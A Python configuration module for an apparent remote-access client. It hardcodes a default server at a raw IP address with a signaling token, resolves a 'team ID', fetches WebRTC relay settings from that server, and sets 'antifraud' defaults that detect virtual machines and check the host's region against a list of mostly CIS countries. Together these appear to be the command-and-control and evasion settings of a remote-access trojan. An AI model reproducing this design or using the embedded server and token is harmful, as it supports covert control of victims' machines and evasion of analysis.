"""Configuration helpers for the remote client."""
from __future__ import annotations

import json
import os
import sys
import uuid
import urllib.parse
import urllib.request
from dataclasses import dataclass

TEAM_ID_FILENAME = "rc_team_id.txt"
ANTIFRAUD_CONFIG_FILENAME = "rc_antifraud.json"
SERVER_CONFIG_FILENAME = "rc_server.json"

DEFAULT_ANTIFRAUD_COUNTRIES = [
    "AM",
    "AZ",
    "BY",
    "GE",
    "KZ",
    "KG",
    "MD",
    "RU",
    "TJ",
    "TM",
    "UA",
    "UZ",
    "CN",
    "IN",
]

DEFAULT_SERVER_URL = "http://79.137.194.213"
DEFAULT_SIGNALING_TOKEN = "Gar8tEadNew0l-DNgY36moO3o_3xRsmF7yhrgRSOMIA"

def _truthy_env(name: str) -> bool:
    value = os.getenv(name, "").strip().lower()
    return value in {"1", "true", "yes", "on"}


def _candidate_config_dirs() -> list[str]:
    candidates: list[str] = []
    if getattr(sys, "frozen", False):
        meipass = getattr(sys, "_MEIPASS", None)
        if isinstance(meipass, str) and meipass:
            candidates.append(meipass)
            candidates.append(os.path.join(meipass, "remote_client"))
        candidates.append(os.path.dirname(sys.executable))
    candidates.append(os.path.dirname(os.path.abspath(__file__)))
    return candidates


def resolve_session_id(session_id: str | None) -> str:
    if session_id:
        return session_id
    env_session = os.getenv("RC_SIGNALING_SESSION")
    if env_session:
        return env_session
    return uuid.uuid4().hex


@dataclass(frozen=True)
class AntiFraudConfig:
    vm_enabled: bool
    region_enabled: bool
    countries: list[str]


def _read_team_id_file() -> str | None:
    for base_dir in _candidate_config_dirs():
        path = os.path.join(base_dir, TEAM_ID_FILENAME)
        try:
            with open(path, "r", encoding="utf-8") as handle:
                value = handle.read().strip()
        except FileNotFoundError:
            continue
        except OSError:
            return None
        if value:
            return value
    return None


def _read_antifraud_config() -> dict | None:
    for base_dir in _candidate_config_dirs():
        path = os.path.join(base_dir, ANTIFRAUD_CONFIG_FILENAME)
        try:
            with open(path, "r", encoding="utf-8") as handle:
                raw = json.load(handle)
        except FileNotFoundError:
            continue
        except (OSError, json.JSONDecodeError):
            return None
        if isinstance(raw, dict):
            return raw
    return None


def _read_server_config() -> dict | None:
    for base_dir in _candidate_config_dirs():
        path = os.path.join(base_dir, SERVER_CONFIG_FILENAME)
        try:
            with open(path, "r", encoding="utf-8") as handle:
                raw = json.load(handle)
        except FileNotFoundError:
            continue
        except (OSError, json.JSONDecodeError):
            return None
        if isinstance(raw, dict):
            return raw
    return None


def read_server_config() -> dict | None:
    """Public accessor for embedded server config."""
    return _read_server_config()


def load_antifraud_config() -> AntiFraudConfig:
    defaults = AntiFraudConfig(
        vm_enabled=True,
        region_enabled=True,
        countries=list(DEFAULT_ANTIFRAUD_COUNTRIES),
    )
    raw = _read_antifraud_config()
    if not raw:
        return defaults
    vm_enabled = raw.get("vm_enabled", defaults.vm_enabled)
    region_enabled = raw.get("region_enabled", defaults.region_enabled)
    countries = raw.get("countries", defaults.countries)
    if not isinstance(countries, list):
        countries = defaults.countries
    countries = [str(code).upper() for code in countries if str(code).strip()]
    if not countries:
        countries = defaults.countries
    return AntiFraudConfig(
        vm_enabled=bool(vm_enabled),
        region_enabled=bool(region_enabled),
        countries=countries,
    )


def resolve_signaling_url() -> str | None:
    raw = _read_server_config()
    if raw:
        for key in ("signaling_url", "server_url", "api_url"):
            value = raw.get(key)
            if isinstance(value, str) and value.strip():
                return value.strip()
    env_url = os.getenv("RC_SIGNALING_URL")
    if env_url:
        return env_url.strip()
    api_url = os.getenv("RC_API_URL")
    if api_url:
        return api_url.strip()
    return DEFAULT_SERVER_URL


def resolve_signaling_token() -> str | None:
    raw = _read_server_config()
    if raw:
        for key in ("signaling_token", "api_token"):
            value = raw.get(key)
            if isinstance(value, str) and value.strip():
                return value.strip()
    env_token = os.getenv("RC_SIGNALING_TOKEN")
    if env_token:
        return env_token.strip()
    api_token = os.getenv("RC_API_TOKEN")
    if api_token:
        return api_token.strip()
    return DEFAULT_SIGNALING_TOKEN


def _fetch_ice_servers_from_url(server_url: str, token: str | None) -> list[dict] | None:
    if not server_url:
        return None
    if "://" not in server_url:
        server_url = f"http://{server_url}"
    parsed = urllib.parse.urlsplit(server_url)
    ice_url = urllib.parse.urlunsplit(
        (parsed.scheme, parsed.netloc, "/ice-config", "", "")
    )
    headers: dict[str, str] = {}
    if token:
        headers["x-rc-token"] = token
        ice_url = f"{ice_url}?token={urllib.parse.quote(token)}"
    request = urllib.request.Request(ice_url, headers=headers)
    try:
        with urllib.request.urlopen(request, timeout=3) as response:
            payload = json.loads(response.read().decode("utf-8"))
    except Exception:
        return None
    servers = payload.get("iceServers")
    if isinstance(servers, list):
        return servers
    return None


def resolve_ice_servers() -> list[dict] | None:
    """Resolve ICE servers from env, embedded config, or server endpoint."""
    if _truthy_env("RC_FORCE_HOST_ICE") or _truthy_env("RC_ICE_HOST_ONLY"):
        return []

    raw = os.getenv("RC_ICE_SERVERS")
    if raw:
        try:
            parsed = json.loads(raw)
        except json.JSONDecodeError:
            parsed = None
        if isinstance(parsed, dict):
            return [parsed]
        if isinstance(parsed, list):
            return parsed

    raw_config = _read_server_config()
    if raw_config:
        servers = raw_config.get("ice_servers") or raw_config.get("iceServers")
        if isinstance(servers, dict):
            return [servers]
        if isinstance(servers, list):
            return servers

    server_url = resolve_signaling_url()
    token = resolve_signaling_token()
    fetched = _fetch_ice_servers_from_url(server_url, token)
    if fetched is not None:
        return fetched
    return None


def resolve_team_id(team_id: str | None) -> str | None:
    if team_id:
        return team_id
    env_team = os.getenv("RC_TEAM_ID")
    if env_team:
        return env_team.strip()
    file_team = _read_team_id_file()
    if file_team:
        return file_team
    return None
